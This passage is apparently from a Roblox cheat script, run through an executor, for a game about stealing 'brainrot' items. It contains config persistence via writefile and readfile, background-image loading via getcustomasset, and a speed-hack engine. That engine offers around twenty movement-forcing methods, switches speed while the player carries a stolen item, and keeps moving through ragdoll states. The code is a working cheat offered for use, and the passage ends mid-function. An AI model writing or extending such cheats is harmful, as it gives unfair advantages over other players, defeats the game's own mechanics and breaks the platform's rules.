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]],
}

local Ilusion_BG_DATA = Ilusion_BG_DATA or nil

local function ensureBgFiles()
	if not writefile then return end
	if type(Ilusion_BG_DATA) ~= "table" then return end
	for i, meta in ipairs(BG_FILES) do
		local b64 = Ilusion_BG_DATA[meta.file]
		if type(b64) == "string" and #b64 > 100 then
			pcall(function()
				if not (isfile and isfile(meta.file)) then
					writefile(meta.file, b64decode(b64))
				end
			end)
		end
	end
end

local function resolveBgAssets()
	ensureBgFiles()
	for i, meta in ipairs(BG_FILES) do
		local ok, asset = pcall(function()
			if getcustomasset then return getcustomasset(meta.file) end
			return nil
		end)
		if ok and asset then
			BG_ASSETS[i] = asset
		else
			BG_ASSETS[i] = nil
		end
	end
end

function applyMenuBackground(idx)
	idx = math.clamp(tonumber(idx) or St.bgIndex or 1, 1, #BG_FILES)
	St.bgIndex = idx
	if MenuBgImage then
		local asset = BG_ASSETS[idx]
		if asset then
			MenuBgImage.Image = asset
			MenuBgImage.ImageTransparency = 0.35
		else
			MenuBgImage.Image = ""
			MenuBgImage.ImageTransparency = 1
		end
	end
	pcall(saveCfg)
end


local CFG = "IlusionAllgear.json"
local _saveToken = 0
function autoSaveDebounced()
	_saveToken = _saveToken + 1
	local t = _saveToken
	task.delay(0.35, function()
 if t == _saveToken then pcall(saveCfg) end
	end)
end
function _serializeValue(v, depth)
	depth = depth or 0
	if depth > 6 then return nil end
	local t = typeof(v)
	if t == "number" or t == "string" or t == "boolean" then
 return v
	elseif t == "EnumItem" then
 return v.Name
	elseif t == "table" then
 local out = {}
 for k2, v2 in pairs(v) do
 local kt = type(k2)
 if kt == "string" or kt == "number" then
 local sv = _serializeValue(v2, depth + 1)
 if sv ~= nil then out[k2] = sv end
 end
 end
 return out
	end
	return nil
end
function saveCfg()
	local d = {}
	-- dump TOÀN BỘ St (mọi key có thể JSON được)
	for k, v in pairs(St) do
 if type(k) == "string" then
 -- không lưu base/pet TP — chỉ nhớ vị trí panel
 if k == "_saveBase" or k == "_savePet" or k == "saveBase" or k == "savePet"
 or k == "_delayBase" or k == "_delayPet" then
 -- skip
 elseif k == "modes" or k == "keys" then
 -- skip, handle below
 else
 local sv = _serializeValue(v)
 if sv ~= nil then d[k] = sv end
 end
 end
	end
	d.modes = {}
	for k, m in pairs(St.modes or {}) do
 if type(m) == "table" then
 d.modes[k] = {
 norm = tonumber(m.norm) or 16,
 steal = tonumber(m.steal) or 16,
 key = (typeof(m.key) == "EnumItem" and m.key.Name) or (type(m.key) == "string" and m.key) or "Unknown",
 }
 end
	end
	d.keys = {}
	for k, v in pairs(St.keys or {}) do
 d.keys[k] = (typeof(v) == "EnumItem" and v.Name) or tostring(v)
	end
	local ok, err = pcall(function()
 if not writefile then error("no writefile") end
 d._saveBase = nil
	d._savePet = nil
	d.saveBase = nil
	d.savePet = nil
	d._delayBase = nil
	d._delayPet = nil
	writefile(CFG, HttpService:JSONEncode(d))
	end)
	if not ok then
 warn("[ILUSIÓN] saveCfg fail:", err)
	end
	return ok
end
function loadCfg()
	local ok, data = pcall(function()
 if isfile and readfile then
 if isfile(CFG) then
 return HttpService:JSONDecode(readfile(CFG))
 end
 for _, old in ipairs({"IlusionOnflop.json", "Ilusion_FullMenu_v1.json", "Ilusion_Config.json", "ILUSIÓN.json"}) do
 if isfile(old) then
 local d = HttpService:JSONDecode(readfile(old))
 pcall(function() writefile(CFG, HttpService:JSONEncode(d)) end)
 return d
 end
 end
 end
	end)
	if not (ok and type(data) == "table") then return false end
	for k, v in pairs(data) do
 if type(k) == "string" and k ~= "modes" and k ~= "keys" then
 St[k] = v
 end
	end
	if type(data.modes) == "table" then
 for k, m in pairs(data.modes) do
 if type(m) == "table" then
 St.modes[k] = St.modes[k] or { norm = 59, steal = 30, key = Enum.KeyCode.Unknown }
 St.modes[k].norm = tonumber(m.norm) or St.modes[k].norm
 St.modes[k].steal = tonumber(m.steal) or St.modes[k].steal
 if type(m.key) == "string" then
 pcall(function() St.modes[k].key = Enum.KeyCode[m.key] end)
 end
 end
 end
	end
	if type(data.keys) == "table" then
 St.keys = St.keys or {}
 for k, name in pairs(data.keys) do
 pcall(function() St.keys[k] = Enum.KeyCode[name] end)
 end
	end
	if type(data.btnSizes) == "table" then
 St.btnSizes = data.btnSizes
 for k,v in pairs(St.btnSizes) do
 St.btnSizes[k] = math.clamp(tonumber(v) or 50, 20, 200)
 end
	end
	if type(data._btnPos) == "table" then St._btnPos = data._btnPos end
	St.stealRadius = tonumber(St.stealRadius) or 60
	St.stealVer = St.stealVer or "V1"
	St.stealBarScale = tonumber(St.stealBarScale) or 1
	if St.showStealBtn == nil then St.showStealBtn = true end
	autoStealRadius = St.stealRadius
	return true
end
loadCfg()
task.spawn(function()
	while true do
 task.wait(3)
 local ok, err = pcall(saveCfg)
 if not ok then warn("[ILUSIÓN] autosave 3s fail:", err) end
	end
end)

----------------------------------------------------------------
----------------------------------------------------------------
-- SPEED — full Empire multi-method loop (Velocity / LV / CFrame / ...)
----------------------------------------------------------------
local speedConnection = nil
local currentSpeedValue = 16
St.speedMethod = St.speedMethod or "Velocity"
St.hyperMult = tonumber(St.hyperMult) or 4

local _spd = {
	lastMethod = nil,
	lastMoveDir = Vector3.zero,
	anchoredBySpeed = nil,
	bodyVel = nil, bodyPosition = nil, bodyForce = nil, bodyThrust = nil,
	linearVel = nil, vectorForce = nil, alignPos = nil,
	rocket = nil, rocketTarget = nil,
	attLinVel = nil, attVecForce = nil, attAlign = nil,
	speedTween = nil,
}

local MOVE_KEYS = {
	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Right] = true,
}

function getCharParts()
	local char = LP.Character
	if not char then return nil, nil end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root then return nil, nil end
	return hum, root
end


----------------------------------------------------------------
-- SPEED LOOP + INF JUMP — FULL EMPIRE (fetched) — no old leftovers
-- 3 mode (Normal/Lagger/Custom) = St.modes + getActiveMoveSpeed
----------------------------------------------------------------
_spd = _spd or {
	lastMethod = nil,
	lastMoveDir = Vector3.zero,
	anchoredBySpeed = nil,
	bodyVel = nil, bodyPosition = nil, bodyForce = nil, bodyThrust = nil,
	linearVel = nil, vectorForce = nil, alignPos = nil,
	rocket = nil, rocketTarget = nil,
	attLinVel = nil, attVecForce = nil, attAlign = nil,
	speedTween = nil,
}
speedConnection = nil
currentSpeedValue = 16

function isCarryingBrainrot(char)
	if not char then return false end
	local ok, st = pcall(function() return LP:GetAttribute("Stealing") end)
	if ok and st == true then return true end
	local ok2, st2 = pcall(function() return char:GetAttribute("Stealing") end)
	if ok2 and st2 == true then return true end
	for _, v in ipairs(char:GetChildren()) do
 if v:IsA("Tool") or v:IsA("Model") or v:IsA("Folder") then
 local n = string.lower(tostring(v.Name))
 if n:find("brainrot", 1, true) or n:find("carriedbrain", 1, true) then
 return true
 end
 end
	end
	return false
end

function getActiveMoveSpeed()
	-- 3 mode speed: Normal / Lagger / Custom (UI + V2 bar)
	local mode = St.activeMode
	if not mode or not St.modes[mode] then
 mode = "Normal"
 St.activeMode = "Normal"
	end
	local m = St.modes[mode] or { norm = 59, steal = 30 }
	local norm = math.clamp(tonumber(m.norm) or 59, 1, 200)
	local steal = math.clamp(tonumber(m.steal) or 30, 1, 200)
	if isCarryingBrainrot(LP.Character) then
 return steal
	end
	return norm
end

function ensureSpeedAttachment(hrp, key, name)
	local att = _spd[key]
	if not att or att.Parent ~= hrp then
 if att then pcall(function() att:Destroy() end) end
 att = Instance.new("Attachment")
 att.Name = name or "IlusionEmpireSpeedAtt"
 att.Parent = hrp
 _spd[key] = att
	end
	return att
end

function destroySpeedObjects() if _spd.anchoredBySpeed then pcall(function() _spd.anchoredBySpeed.Anchored = false end); _spd.anchoredBySpeed = nil end if _spd.bodyVel then pcall(function() _spd.bodyVel:Destroy() end); _spd.bodyVel = nil end if _spd.bodyPosition then pcall(function() _spd.bodyPosition:Destroy() end); _spd.bodyPosition = nil end if _spd.bodyForce then pcall(function() _spd.bodyForce:Destroy() end); _spd.bodyForce = nil end if _spd.bodyThrust then pcall(function() _spd.bodyThrust:Destroy() end); _spd.bodyThrust = nil end if _spd.linearVel then pcall(function() _spd.linearVel:Destroy() end); _spd.linearVel = nil end if _spd.vectorForce then pcall(function() _spd.vectorForce:Destroy() end); _spd.vectorForce = nil end if _spd.alignPos then pcall(function() _spd.alignPos:Destroy() end); _spd.alignPos = nil end if _spd.rocket then pcall(function() _spd.rocket:Destroy() end); _spd.rocket = nil end if _spd.rocketTarget then pcall(function() _spd.rocketTarget:Destroy() end); _spd.rocketTarget = nil end if _spd.attLinVel then pcall(function() _spd.attLinVel:Destroy() end); _spd.attLinVel = nil end if _spd.attVecForce then pcall(function() _spd.attVecForce:Destroy() end); _spd.attVecForce = nil end if _spd.attAlign then pcall(function() _spd.attAlign:Destroy() end); _spd.attAlign = nil end if _spd.speedTween then pcall(function() _spd.speedTween:Cancel() end); _spd.speedTween = nil end end function applySpeedMethod(hrp, hum, dir, spd, dt) local step = dt or 1/60 local m = (St.speedMethod or "Velocity") if _spd.lastMethod ~= m then destroySpeedObjects() if m ~= "WalkSpeed" and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end _spd.lastMethod = m end local char = hrp.Parent local targetPos = hrp.Position + (dir * spd * step) local function massImpulse(direction, targetSpeed) local mass = hrp.AssemblyMass or 1 local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(direction.X * targetSpeed, current.Y, direction.Z * targetSpeed) local delta = desired - current pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end) end if m == "Velocity" then massImpulse(dir, spd) elseif m == "AssemblyLinearVelocity" then massImpulse(dir, spd) elseif m == "Velocity Lerp" then local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd) local blended = current:Lerp(desired, 0.6) local mass = hrp.AssemblyMass or 1 pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end) elseif m == "AssemblyLinearVelocity Lerp" then local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd) local blended = current:Lerp(desired, 0.6) local mass = hrp.AssemblyMass or 1 pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end) elseif m == "CFrame" then hrp.CFrame = hrp.CFrame + (dir * spd * step) elseif m == "CFrame Lerp" then hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + (dir * spd * step), 0.5) elseif m == "Hyper CFrame" then hrp.CFrame = hrp.CFrame + (dir * spd * ((St.hyperMult or 4) or 4) * step) elseif m == "Anchored CFrame" then if not hrp.Anchored then hrp.Anchored = true _spd.anchoredBySpeed = hrp end hrp.CFrame = hrp.CFrame + (dir * spd * step) elseif m == "PivotTo" then hrp:PivotTo(hrp.CFrame + (dir * spd * step)) elseif m == "Model PivotTo" then if char and char:IsA("Model") then char:PivotTo(char:GetPivot() + (dir * spd * step)) else hrp:PivotTo(hrp.CFrame + (dir * spd * step)) end elseif m == "Tween CFrame" then if _spd.speedTween then pcall(function() _spd.speedTween:Cancel() end) end _spd.speedTween = TS:Create(hrp, TweenInfo.new(step, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame + (dir * spd * step)}) _spd.speedTween:Play() elseif m == "WalkSpeed" then hum.WalkSpeed = spd elseif m == "Humanoid Move" then hum.WalkSpeed = spd hum:Move(dir) elseif m == "Humanoid MoveTo" then hum:MoveTo(targetPos, hrp) elseif m == "BodyVelocity" then if not _spd.bodyVel or _spd.bodyVel.Parent ~= hrp then if _spd.bodyVel then pcall(function() _spd.bodyVel:Destroy() end) end _spd.bodyVel = Instance.new("BodyVelocity") _spd.bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyVel.Parent = hrp end _spd.bodyVel.Velocity = Vector3.new(dir.X*spd, _spd.bodyVel.Velocity.Y, dir.Z*spd) elseif m == "BodyPosition" then if not _spd.bodyPosition or _spd.bodyPosition.Parent ~= hrp then if _spd.bodyPosition then pcall(function() _spd.bodyPosition:Destroy() end) end _spd.bodyPosition = Instance.new("BodyPosition") _spd.bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyPosition.P = 500 _spd.bodyPosition.D = 50 _spd.bodyPosition.Parent = hrp end _spd.bodyPosition.Position = targetPos elseif m == "BodyForce" then if not _spd.bodyForce or _spd.bodyForce.Parent ~= hrp then if _spd.bodyForce then pcall(function() _spd.bodyForce:Destroy() end) end _spd.bodyForce = Instance.new("BodyForce") _spd.bodyForce.Parent = hrp end _spd.bodyForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "BodyThrust" then if not _spd.bodyThrust or _spd.bodyThrust.Parent ~= hrp then if _spd.bodyThrust then pcall(function() _spd.bodyThrust:Destroy() end) end _spd.bodyThrust = Instance.new("BodyThrust") _spd.bodyThrust.Force = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyThrust.Parent = hrp end _spd.bodyThrust.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "LinearVelocity" then if not _spd.linearVel or _spd.linearVel.Parent ~= hrp then if _spd.linearVel then pcall(function() _spd.linearVel:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attLinVel", "MoveeLinVelAtt") _spd.linearVel = Instance.new("LinearVelocity") _spd.linearVel.Attachment0 = att _spd.linearVel.MaxForce = 1e8 _spd.linearVel.RelativeTo = Enum.ActuatorRelativeTo.World _spd.linearVel.Parent = hrp end _spd.linearVel.VectorVelocity = Vector3.new(dir.X*spd, _spd.linearVel.VectorVelocity.Y, dir.Z*spd) elseif m == "VectorForce" then if not _spd.vectorForce or _spd.vectorForce.Parent ~= hrp then if _spd.vectorForce then pcall(function() _spd.vectorForce:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attVecForce", "MoveeVecForceAtt") _spd.vectorForce = Instance.new("VectorForce") _spd.vectorForce.Attachment0 = att _spd.vectorForce.RelativeTo = Enum.ActuatorRelativeTo.World _spd.vectorForce.Parent = hrp end _spd.vectorForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "AlignPosition" then if not _spd.alignPos or _spd.alignPos.Parent ~= hrp then if _spd.alignPos then pcall(function() _spd.alignPos:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attAlign", "MoveeAlignAtt") _spd.alignPos = Instance.new("AlignPosition") _spd.alignPos.Attachment0 = att _spd.alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment _spd.alignPos.MaxForce = math.huge _spd.alignPos.Responsiveness = 15 _spd.alignPos.RigidityEnabled = false _spd.alignPos.Parent = hrp end _spd.alignPos.Position = targetPos elseif m == "ApplyImpulse" then local mass = hrp.AssemblyMass or 1 local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd) local delta = desired - current pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end) elseif m == "RocketPropulsion" then if not _spd.rocket or _spd.rocket.Parent ~= hrp or not _spd.rocketTarget then if _spd.rocket then pcall(function() _spd.rocket:Destroy() end) end if _spd.rocketTarget then pcall(function() _spd.rocketTarget:Destroy() end) end _spd.rocketTarget = Instance.new("Part") _spd.rocketTarget.Name = "MoveeRocketTarget" _spd.rocketTarget.Anchored = true _spd.rocketTarget.CanCollide = false _spd.rocketTarget.Transparency = 1 _spd.rocketTarget.Size = Vector3.new(1,1,1) _spd.rocketTarget.Parent = workspace _spd.rocket = Instance.new("RocketPropulsion") _spd.rocket.MaxThrust = 3000 _spd.rocket.MaxTorque = 1000 _spd.rocket.ThrustP = 100 _spd.rocket.ThrustD = 20 _spd.rocket.TurnP = 100 _spd.rocket.TurnD = 10 _spd.rocket.Target = _spd.rocketTarget _spd.rocket.Parent = hrp end _spd.rocketTarget.Position = targetPos pcall(function() _spd.rocket:Fire() end) end end 

function stopSpeedBoost()
	if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
	end
	pcall(destroySpeedObjects)
end

function startSpeedBoost()
	if not St.speedOn then
 stopSpeedBoost()
 return
	end
	currentSpeedValue = getActiveMoveSpeed()
	if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
	end
	-- EMPIRE full loop (RenderStepped)
	speedConnection = RS.RenderStepped:Connect(function(dt)
 if not St.speedOn then return end
 local char = LP.Character
 if not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 local hrp = char:FindFirstChild("HumanoidRootPart")
 if not hum or not hrp then return end
 -- ragdoll → stop
 local stt = hum:GetState()
 if stt == Enum.HumanoidStateType.Physics
 or stt == Enum.HumanoidStateType.Ragdoll
 or stt == Enum.HumanoidStateType.FallingDown
 or hum.Health <= 0 then
 _spd.lastMoveDir = Vector3.zero
 destroySpeedObjects()
 return
 end
 local md = hum.MoveDirection
 local spd = getActiveMoveSpeed()
 currentSpeedValue = spd
 local dir = Vector3.zero
 if md.Magnitude > 0.01 then
 _spd.lastMoveDir = md
 dir = md
 else
 -- giữ hướng khi anti ragdoll + phím còn giữ (Empire style)
 local anyHeld = false
 if type(MOVE_KEYS) == "table" then
 for key in pairs(MOVE_KEYS) do
 if UIS:IsKeyDown(key) then anyHeld = true break end
 end
 end
